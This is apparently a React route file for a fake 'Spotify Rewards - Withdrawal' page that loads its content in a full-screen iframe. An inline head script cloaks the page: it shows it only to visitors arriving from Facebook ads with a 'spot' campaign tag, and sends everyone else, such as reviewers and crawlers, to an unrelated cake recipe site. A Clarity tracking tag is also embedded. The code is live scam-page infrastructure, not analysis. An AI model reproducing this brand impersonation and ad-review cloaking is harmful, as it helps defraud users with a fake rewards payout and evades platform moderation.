import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";


export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Spotify Rewards - Withdrawal" },
      {
        name: "description",
        content: "Check your Spotify Rewards balance and request your withdrawal.",
      },
      { property: "og:title", content: "Spotify Rewards - Withdrawal" },
      {
        property: "og:description",
        content: "Check your Spotify Rewards balance and request your withdrawal.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    scripts: [
      {
        children: `(function(){try{var h=location.hostname;var dev=h==='localhost'||h==='127.0.0.1'||h.indexOf('id-preview--')===0||h.indexOf('-dev.lovable.app')>-1||h.indexOf('.lovableproject.com')>-1||h.indexOf('.sandbox.lovable.dev')>-1;var q=new URLSearchParams(location.search);if(dev||q.get('dev')==='1')return;var c=((q.get('utm_campaign')||q.get('campaign')||q.get('utm_campaign_name')||'')+'').toLowerCase();if(c.indexOf('spot')>-1&&q.get('fbclid'))return;document.title='';if(document.documentElement){document.documentElement.style.visibility='hidden';document.documentElement.style.background='#fff';}location.replace('https://www.tudogostoso.com.br/receita/29124-bolo-simples.html');}catch(e){}})();`,
      },
      {
        children: `(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, "clarity", "script", "yft2re9p41");`,
      },
    ],
  }),
  component: SpotifyPage,
});

function SpotifyPage() {
  const [search, setSearch] = useState("");

  useEffect(() => {
    setSearch(window.location.search);
  }, []);

  return (
    <iframe
      src={`/sp/type/index.html${search}`}
      title="Spotify Rewards"
      style={{
        position: "fixed",
        inset: 0,
        width: "100%",
        height: "100%",
        border: "none",
      }}
    />
  );
}
